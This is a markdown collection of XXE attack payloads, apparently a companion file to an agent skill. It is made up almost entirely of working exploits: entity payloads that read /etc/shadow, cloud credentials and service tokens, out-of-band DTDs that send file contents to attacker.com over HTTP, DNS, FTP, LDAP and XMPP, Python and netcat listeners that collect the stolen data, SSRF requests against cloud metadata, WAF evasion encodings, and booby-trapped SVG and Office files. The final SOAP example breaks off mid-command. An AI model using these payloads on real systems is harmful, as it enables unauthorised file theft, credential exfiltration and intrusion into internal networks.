# XXE Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all XXE attack payloads organized by category.

---

## 1. Basic XXE Detection (Probing)

Test whether the XML parser resolves external entities and returns content in the response.

```xml
<!-- Classic XXE -- read /etc/passwd via general entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Read /etc/hostname for lower-impact proof -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>

<!-- Using SYSTEM keyword with http:// for SSRF validation -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-callback">
]>
<root>&xxe;</root>

<!-- Using PUBLIC keyword (alternative to SYSTEM) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "Public ID" "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Quick curl-based testing**:

```bash
# Test SOAP endpoint for XXE
curl -X POST "http://target/api/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Test REST API with XML content type
curl -X POST "http://target/api/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>'

# Content-Type fuzzing -- send XML to a JSON API
curl -X POST "http://target/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'
```

---

## 2. File Disclosure Payloads

Read local files through XXE entity injection.

### Unix/Linux File Targets

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/net/tcp">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/net/arp">
]>
<root>&xxe;</root>
```

### Application Configuration Files

```xml
<!-- Java application: read common config files -->
<!ENTITY xxe SYSTEM "file:///app/config/application.properties">
<!ENTITY xxe SYSTEM "file:///app/config/database.yml">
<!ENTITY xxe SYSTEM "file:///app/.env">
<!ENTITY xxe SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml">
<!ENTITY xxe SYSTEM "file:///usr/local/tomcat/conf/tomcat-users.xml">

<!-- Python application -->
<!ENTITY xxe SYSTEM "file:///app/settings.py">
<!ENTITY xxe SYSTEM "file:///app/.env">

<!-- PHP application -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">
<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">
<!ENTITY xxe SYSTEM "file:///etc/apache2/sites-enabled/000-default.conf">

<!-- Cloud credentials -->
<!ENTITY xxe SYSTEM "file:///home/ubuntu/.aws/credentials">
<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
```

### Windows File Targets

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
<!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///C:/ProgramData/application/config.xml">
```

### PHP expect:// Protocol (Remote Code Execution)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://cat%20/etc/passwd">
]>
<root>&xxe;</root>
```

### PHP php://filter for Source Code Disclosure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>
```

---

## 3. SVG File Upload XXE

Inject XXE payloads through SVG image uploads that are parsed server-side.

```xml
<!-- Basic SVG XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16" font-size="14">&xxe;</text>
</svg>

<!-- SVG with external DTD reference -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16" font-size="14">&exfil;</text>
</svg>

<!-- SVG with embedded image fetching internal resource -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"
         width="100" height="100"/>
</svg>
```

**Upload and test**:

```bash
# Create malicious SVG
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16" font-size="14">&xxe;</text>
</svg>
EOF

# Upload to target
curl -X POST "http://target/upload" -F "file=@xxe.svg" -F "type=image/svg+xml"

# Check if the rendered SVG contains file content
curl "http://target/images/xxe.svg"
```

---

## 4. SOAP Envelope XXE

Inject XXE into SOAP request bodies.

```xml
<!-- SOAP XXE -- inject entity in SOAP envelope -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:api="http://target.com/api">
  <soapenv:Body>
    <api:GetUser>
      <api:userId>&xxe;</api:userId>
    </api:GetUser>
  </soapenv:Body>
</soapenv:Envelope>

<!-- SOAP XXE with CDATA wrapping for special characters -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <api:Search>
      <api:query><![CDATA[&xxe;]]></api:query>
    </api:Search>
  </soapenv:Body>
</soapenv:Envelope>
```

```bash
# Send SOAP XXE payload
curl -X POST "http://target/soap/api" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: http://target.com/api/GetUser" \
  -d @soap_xxe_payload.xml
```

---

## 5. Blind XXE via OOB (Out-of-Band)

When the application does not return entity content in the response, use OOB channels to exfiltrate data.

### HTTP-Based OOB Exfiltration

**Attacker DTD file** (hosted at `http://attacker.com/xxe.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfil;
```

**Payload sent to target**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

**Capture exfiltrated data**:

```bash
# Simple Python HTTP listener to capture data
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[EXFIL] {self.path}')
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"

# Or use netcat
nc -lvnp 80
```

### DNS-Based OOB Exfiltration

```xml
<!-- DNS exfiltration -- load file content as DNS subdomain -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe-dns.dtd">
  %dtd;
]>
<root>test</root>
```

**Attacker DTD for DNS exfiltration** (`xxe-dns.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/xxe'>">
%eval;
%exfil;
```

### FTP-Based OOB Exfiltration

```xml
<!-- FTP exfiltration -- send file content via FTP passive mode -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe-ftp.dtd">
  %dtd;
]>
<root>test</root>
```

**Attacker DTD for FTP exfiltration** (`xxe-ftp.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%exfil;
```

**FTP listener to capture data**:

```bash
# Simple FTP listener with netcat
nc -lvnp 2121

# Or use a Python FTP server
pip3 install pyftpdlib
python3 -m pyftpdlib -p 2121 -w /tmp/xxe_loot
```

### XXEinjector Automated Blind XXE

```bash
# HTTP-based OOB exfiltration
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=http --verbose

# HTTPS exfiltration
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=https --verbose

# FTP-based exfiltration
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=ftp --ftpport=2121 --verbose

# DNS-based exfiltration
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=dns --verbose

# Read multiple files
ruby XXEinjector.rb --host=attacker.com \
  --file=/etc/shadow --oob=http --verbose
ruby XXEinjector.rb --host=attacker.com \
  --file=/etc/hosts --oob=http --verbose
ruby XXEinjector.rb --host=attacker.com \
  --file=/proc/self/environ --oob=http --verbose

# Using a request file (for complex endpoints)
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=http --xml-embed --output=xxe_results.txt
```

---

## 6. Error-Based XXE

Force the XML parser to include entity content in error messages.

```xml
<!-- Error-based XXE -- trigger error that includes file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <element>&xxe;</element>
  <broken>&nonexistent;</broken>
</root>

<!-- Error-based via invalid URL containing file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>

<!-- Error-based XXE using malformed XML after entity load -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;<broken_unclosed_tag></root>
```

---

## 7. XXE to SSRF

Use XXE to force the XML parser to make requests to internal services.

### Internal Network Scanning

```xml
<!-- XXE to scan internal port -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.0.1:6379/">
]>
<root>&xxe;</root>
```

### Cloud Metadata Extraction via XXE

```xml
<!-- AWS EC2 metadata via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">
]>
<root>&xxe;</root>

<!-- GCP metadata via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<root>&xxe;</root>

<!-- Azure metadata via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<root>&xxe;</root>
```

### XXE to Internal Redis

```xml
<!-- XXE to interact with internal Redis via gopher:// -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
]>
<root>&xxe;</root>
```

---

## 8. Parameter Entity Exploitation

Parameter entities (%) are resolved within DTDs and enable advanced attack patterns that bypass general entity filters.

```xml
<!-- Basic parameter entity -- load remote DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>

<!-- Parameter entity chain: remote DTD defines another entity -->
<!-- evil.dtd hosted on attacker server: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
<!-- <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?c=%file;'>"> -->
<!-- %eval; -->
<!-- %send; -->

<!-- Load remote DTD from within internal DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe-chain.dtd">
  %remote;
]>
<root>&exfil;</root>
```

**Attacker DTD** (`xxe-chain.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % intermediate "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?d=%file;'>">
%intermediate;
```

### UTF-16 Encoding Bypass

```bash
# Encode XXE payload in UTF-16 to bypass WAF keyword detection
# The WAF checks for "DOCTYPE", "ENTITY", "SYSTEM" in ASCII but UTF-16 uses 2 bytes per character
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<root>&xxe;</root>'''
with open('xxe_utf16.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
"

# Send the UTF-16 encoded payload
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml; charset=utf-16" \
  --data-binary @xxe_utf16.xml
```

---

## 9. XInclude Injection

When the application embeds user input into an existing XML document (and you cannot control the DOCTYPE), use XInclude to trigger XXE.

```xml
<!-- XInclude-based file read -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- XInclude with fallback -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/shadow">
    <xi:fallback>File not found</xi:fallback>
  </xi:include>
</foo>

<!-- XInclude to SSRF -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>

<!-- XInclude with XML parsing -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///app/config/database.xml"/>
</foo>
```

**Testing XInclude via form input**:

```bash
# If user input is embedded in XML, inject XInclude directive
curl -X POST "http://target/api/comment" \
  -d 'comment=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
```

---

## 10. Office Document (OOXML) XXE

Inject XXE payloads into Office documents using oxml_xxe.

### oxml_xxe Tool Usage

```bash
# Basic DOCX XXE injection
python3 oxml_xxe.py --file template.docx --inject \
  --payload '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' \
  --output malicious.docx

# Use a DTD file for blind XXE
python3 oxml_xxe.py --file template.docx --inject \
  --payload-file blind.dtd \
  --output malicious.docx

# Inject into XLSX spreadsheet
python3 oxml_xxe.py --file template.xlsx --inject \
  --payload '<!ENTITY xxe SYSTEM "http://attacker.com/xxe-callback">' \
  --output malicious.xlsx

# Inject into PPTX presentation
python3 oxml_xxe.py --file template.pptx --inject \
  --payload '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">' \
  --output malicious.pptx
```

### Manual OOXML XXE Construction

```bash
# Step 1: Unzip the Office document
unzip template.docx -d docx_extracted/

# Step 2: Edit word/document.xml to add XXE payload
# Add DOCTYPE declaration before the root element
cat > docx_extracted/word/document.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/ooxml-callback">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
XMLEOF

# Step 3: Re-zip as DOCX
cd docx_extracted && zip -r ../malicious.docx . && cd ..

# Step 4: Upload to target
curl -X POST "http://target/upload/document" \
  -F "file=@malicious.docx" \
  -F "type=application/vnd.openxmlformats-officedocument.wordprocessingml.document"
```

### OOXML [Content_Types].xml Injection

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/ooxml.dtd">
  %dtd;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
</Types>
```

---

## 11. WAF Bypass Techniques

### Encoding and Obfuscation

```bash
# Double URL encoding of DOCTYPE keywords
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -d '%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20foo%20%5B%0A%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%0A%5D%3E%0A%3Croot%3E%26xxe%3B%3C%2Froot%3E'

# Base64-encoded XML body
cat << 'EOF' | base64 | curl -X POST "http://target/api" \
  -H "Content-Type: application/xml; charset=utf-8" \
  -H "Content-Transfer-Encoding: base64" \
  --data-binary @-
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF

# Gzip-compressed XML payload
cat << 'EOF' > payload.xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
gzip payload.xml
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -H "Content-Encoding: gzip" \
  --data-binary @payload.xml.gz
```

### Comment and Whitespace Obfuscation

```xml
<!-- Break up DOCTYPE keyword with XML comments -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTY<!---->PE foo [
  <!ENTI<!---->TY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Break up with whitespace and newlines -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE
  foo
  [
  <!ENTITY
    xxe
    SYSTEM
    "file:///etc/passwd"
  >
]>
<root>&xxe;</root>
```

### Alternative Entity Syntax

```xml
<!-- Use PUBLIC instead of SYSTEM -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "test" "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Use external DTD with parameter entities -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % sp SYSTEM "http://attacker.com/dtd">
  %sp;
]>
<root>&exfil;</root>

<!-- Use data:// protocol (PHP) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,cmVhZCBmaWxlIGNvbnRlbnQ=">
]>
<root>&xxe;</root>
```

---

## 12. Multi-Stage DTD Payload Construction

Advanced payloads for complex exfiltration scenarios.

```bash
# Generate dynamic DTD based on target reconnaissance
python3 << 'PYEOF'
import http.server
import urllib.parse

class DTDHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/xxe.dtd":
            # Dynamic DTD that reads requested file and exfiltrates
            params = urllib.parse.parse_qs(
                urllib.parse.urlparse(self.path).query
            )
            target_file = params.get("file", ["/etc/passwd"])[0]
            dtd = f'''<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?d=%file;'>">
%eval;
%send;'''
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.end_headers()
            self.wfile.write(dtd.encode())
        else:
            # Log exfiltrated data
            print(f"[EXFIL] {self.path}")
            self.send_response(200)
            self.end_headers()

http.server.HTTPServer(("0.0.0.0", 80), DTDHandler).serve_forever()
PYEOF
```

**Target payload referencing dynamic DTD**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd?file=/etc/shadow">
  %dtd;
]>
<root>test</root>
```

---

## 13. XXE via Burp Suite Collaborator

```bash
# Generate Collaborator payload in Burp Suite
# Right-click -> Insert Collaborator payload

# Use Collaborator in XXE payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR_SUBDOMAIN.burpcollaborator.net">
]>
<root>&xxe;</root>

# Blind XXE with Collaborator via parameter entity
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://COLLABORATOR_SUBDOMAIN.burpcollaborator.net/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

---

## 14. Oracle Database XXE via odat

```bash
# Oracle TNS listener XXE exploitation
# Extract files from database server
odat.py utlhttp --server-ip target --server-port 1521 \
  --dSid ORCL --getFile /etc/passwd

# Oracle HTTPURITYPE XXE
odat.py httpuritype --server-ip target --server-port 1521 \
  --dSid ORCL --getFile /etc/oratab

# Extract Oracle credentials
odat.py utlhttp --server-ip target --server-port 1521 \
  --dSid ORCL --getFile /opt/oracle/product/19c/dbhome_1/network/admin/tnsnames.ora
```

---

## 15. Advanced XXE Payload Variations

### 15.1 XXE with Character Encoding Tricks

```bash
# XXE payload with UTF-16 BE encoding to bypass WAF
python3 -c "
payload = '<?xml version=\"1.0\" encoding=\"UTF-16BE\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
with open('xxe_utf16be.xml', 'wb') as f:
    f.write(payload.encode('utf-16-be'))
"
curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=utf-16be" --data-binary @xxe_utf16be.xml

# XXE with Shift-JIS encoding (Japanese legacy systems)
python3 -c "
payload = '<?xml version=\"1.0\" encoding=\"Shift_JIS\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
with open('xxe_sjis.xml', 'wb') as f:
    f.write(payload.encode('shift_jis'))
"
curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=shift_jis" --data-binary @xxe_sjis.xml

# XXE with EUC-JP encoding
python3 -c "
payload = '<?xml version=\"1.0\" encoding=\"EUC-JP\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
with open('xxe_eucjp.xml', 'wb') as f:
    f.write(payload.encode('euc-jp'))
"
curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=euc-jp" --data-binary @xxe_eucjp.xml
```

### 15.2 XXE with XML Compression and Chunked Transfer

```bash
# Gzip-compressed XXE payload to bypass WAF inspection
cat << 'XMLEOF' > xxe_payload.xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
XMLEOF
gzip -c xxe_payload.xml > xxe_payload.xml.gz
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -H "Content-Encoding: gzip" \
  --data-binary @xxe_payload.xml.gz

# Chunked transfer encoding for XXE payload
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -H "Transfer-Encoding: chunked" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Base64-encoded XXE body
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | base64 | \
  curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -H "Content-Transfer-Encoding: base64" \
  --data-binary @-
```

---

## 16. OOB XXE with Alternative Protocols

### 16.1 OOB XXE via WebSocket Exfiltration

```bash
# XXE exfiltration via WebSocket connection
# Attacker DTD that sends data through a WebSocket
cat > xxe_ws.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/ws-exfil?d=%file;'>">
%eval;
%exfil;
DTDEOF

# WebSocket relay server to capture exfiltrated data
python3 << 'PYEOF'
import asyncio, websockets, http.server

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[XXE EXFIL] {self.path}")
        self.send_response(200)
        self.end_headers()

http.server.HTTPServer(("0.0.0.0", 80), ExfilHandler).serve_forever()
PYEOF
```

### 16.2 OOB XXE via Jabber/XMPP

```bash
# XXE exfiltration via XMPP message to attacker's Jabber server
# DTD that sends file content as XMPP message body
cat > xxe_xmpp.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'xmpp://attacker@jabber.evil.com?message=%file;'>">
%eval;
%exfil;
DTDEOF
```

### 16.3 OOB XXE via LDAP

```bash
# XXE exfiltration via LDAP query to attacker's LDAP server
# The file content is embedded as the LDAP search base
cat > xxe_ldap.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ldap://attacker.com:1389/%file;'>">
%eval;
%exfil;
DTDEOF

# Rogue LDAP server to capture exfiltrated data
python3 << 'PYEOF'
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 1389))
sock.listen(5)
print("[LDAP] Listening on port 1389 for XXE exfiltration...")
while True:
    conn, addr = sock.accept()
    data = conn.recv(4096)
    print(f"[LDAP EXFIL] From {addr}: {data}")
    conn.close()
PYEOF
```

---

## 17. XXE in SOAP/WSDL Advanced Exploitation

### 17.1 XXE in SOAP with WS-Security

```xml
<!-- XXE in SOAP with WS-Security header -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
  <soapenv:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>&xxe;</wsse:Username>
        <wsse:Password>test</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body>
    <api:GetData/>
  </soapenv:Body>
</soapenv:Envelope>
```

### 17.2 XXE in WSDL Definition

```xml
<!-- XXE injection in WSDL import/include -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<definitions name="XXEService"
             targetNamespace="http://target.com/wsdl"
             xmlns="http://schemas.xmlsoap.org/wsdl/">
  <import namespace="http://attacker.com/evil" location="http://attacker.com/evil.wsdl"/>
  <message name="Request">
    <part name="body" element="xs:string"/>
  </message>
</definitions>
```

### 17.3 SOAP XXE with MTOM Attachment

```bash
# Send XXE payload in SOAP MTOM (Message Transmission Optimization Mechanism)
# Some SOAP parsers process external entities in MIME parts
curl -X POST "http://target/soap/service" \
  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; boundary=MIME_BOUNDARY" \
  --data-binary @- << 'MIMEEOF'
--MIME_BOUNDARY
Content-Type: application/xop+xml; charset=UTF-8
Content-Transfer-Encoding: 8bit

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>
